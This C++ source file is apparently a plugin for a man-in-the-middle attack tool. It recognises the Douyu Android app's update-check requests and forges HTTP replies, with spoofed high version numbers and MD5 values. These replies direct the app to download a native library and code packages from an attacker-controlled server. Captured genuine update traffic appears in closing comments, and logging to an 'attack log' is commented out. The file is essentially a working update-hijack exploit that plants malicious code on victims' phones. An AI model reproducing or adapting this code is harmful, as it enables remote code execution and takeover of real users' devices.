#include "douyuplugin.h"
#include "../httputils.h"
#include "../cipher/CryptoUtils.h"

int gDouyuFlag = 0;

int DouyuPlugin::isDouyu(const char * url, const char * host) {

	///client/plugin.json?plugininfo
	if (strstr(host, "update.qvb.qcloud.com") && strstr(url, "/checkupdate/v2?"))
	{
		gDouyuFlag = 1;
		return TRUE;
	}
	else if (strstr(host, "vrcn.loveota.com") && strstr(url, "/chksdkupdate.php?"))
	{
		gDouyuFlag = 2;
		return TRUE;
	}

	return FALSE;
}


int makeDouyuSoReply(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/json; charset=utf-8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;
	string version = "v9.03.43";	//v5.03.43

	string sofn = "libp2pmodule.so";
	string filename1 = Public::getUserPluginPath(username) + sofn;

	char szmd5_1[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);

	char hdrformat[4096];
	char szformat[] = "{\r\n"
		"\"update\": true, \r\n"
		"\"downloadUrl\": {\r\n"
		"\"libp2pmodule\": {\r\n"
		"\"update\": true, \r\n"
		"\"jniVersion\": \"v2\", \r\n"
		"\"version\": \"%s\", \r\n"
		"\"md5token\": \"%s\", \r\n"
		"\"url\": \"http://%s/%s\"\r\n"
		"}\r\n"
		"}\r\n"
		"}";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat, version.c_str(), szmd5_1, strip.c_str(), sofn.c_str());

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	//char szout[4096];
	//int outlen = sprintf_s(szout, 4096, "miaopai reply:%s\r\n", dstbuf);
	//Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}


int makeDouyuJarReply(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/xml; charset=utf-8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	unsigned char hexmd5[64] = { 0 };
	string jarfn2 = "douyusdk.zip";
	string filename2 = Public::getUserPluginPath(username) + jarfn2;
	char szmd5_2[64] = { 0 };
	int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szmd5_2, hexmd5, 1);

	string jarfn1 = "douyuvm.zip";
	string filename1 = Public::getUserPluginPath(username) + jarfn1;
	char szmd5_1[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);

	int ver1 = 91307;
	int ver2 = 980904;

	char hdrformat[4096];
	char szformat[] = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
		"<listpack ver=\"1.0\">\r\n"
		"<upinfo>\r\n"
		"<info tp=\"zip\" flag=\"0\" source=\"http://%s/%s\" vcode=\"%u\" vsize=\"%u\" vmd5=\"%s\"/>\r\n"
		"<info tp=\"main\" flag=\"0\" source=\"http://%s/%s\" vcode=\"%u\" vsize=\"%u\" vmd5=\"%s\"/>\r\n"
		"</upinfo>\r\n"
		"</listpack>";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,
		strip.c_str(),jarfn1.c_str(),ver1,filesize1, szmd5_1, 
		strip.c_str(), jarfn2.c_str(),ver2,filesize2,szmd5_2);

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	//char szout[4096];
	//int outlen = sprintf_s(szout, 4096, "miaopai reply:%s\r\n", dstbuf);
	//Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}


int DouyuPlugin::makeDouyuPluginReply(char * dstbuf, int dstbuflimit, string username) {
	if (gDouyuFlag == 1)
	{
		return makeDouyuSoReply(dstbuf, dstbuflimit, username);
	}else if (gDouyuFlag == 2)
	{
		return makeDouyuJarReply(dstbuf, dstbuflimit, username);
		
	}
	return 0;
}


/*
GET /checkupdate/v2?abi=armeabi-v7a&token=04452C1FBB4FF9E7C4800EC872737376&timeStamp=1557501316&jniVersion=v2&packageName=air.tv.douyu.android&fileId=libp2pmodule&fifoVersion=v5.03.38 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: update.qvb.qcloud.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,HEAD,PUT,POST,DELETE
Content-Type: application/json; charset=utf-8
Content-Length: 314
Date: Fri, 10 May 2019 15:15:17 GMT
Connection: keep-alive

{
"update": true,
"downloadUrl": {
"libp2pmodule": {
"update": true,
"jniVersion": "v2",
"version": "v5.03.43",
"md5token": "12eb351e25ec51e4bee8a59278a9fb52",
"url": "http://videocloudp2p-1251316161.file.myqcloud.com/sdk/v2/v5.03.43/armeabi-v7a/0/libp2pmodule.so"
}
}
}
*/


/*
GET /chksdkupdate.php?chid=66770&sdkver=180903&mainver=180903&compver=60010&mustver=180904&uiver=180903&cpmeta=douyu&type=109&pkg=air.tv.douyu.android&vercode=10594003&api=22&release=5.1&abi=armeabi-v7a&abi2=armeabi&abilist=arm64-v8a%2Carmeabi-v7a%2Carmeabi&abilist32=armeabi-v7a%2Carmeabi&abilist64=arm64-v8a&brand=HUAWEI&manufacturer=HUAWEI&model=HUAWEI%20TAG-TL00&product=TAG-TL00 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI TAG-TL00 Build/HUAWEITAG-TL00)
Host: 49453k0l.vrcn.loveota.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: ADSSERVER/82608
Date: Mon, 15 Jul 2019 04:19:42 GMT
Content-Type: text/xml; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Content-Encoding: gzip
Set-Cookie: __ads_session=eFn0whYzUQlkS01E7wA=; domain=.loveota.com; path=/
X-Powered-By-ADS: chn-shads-3-13

<?xml version="1.0" encoding="utf-8"?>
<listpack ver="1.0">
<upinfo>
<info tp="zip" flag="0" source="http://apkota.douyucdn.cn/vmupdate/pack/66770/common/61307/vm_generic/109/-1/-1/vm.zip" vcode="61307" vsize="1509937" vmd5="f0e915d367c951b47f529c4010baab8f"/>
<info tp="main" flag="0" source="http://apkota.douyucdn.cn/mainjarupdate/gamesdk/66770/common109/180904/180903/main_generic/109/-1/-1/main.zip" vcode="180904" vsize="747337" vmd5="61860835be9a11a75adb9ff3c80d38c8"/>
</upinfo>
</listpack>
*/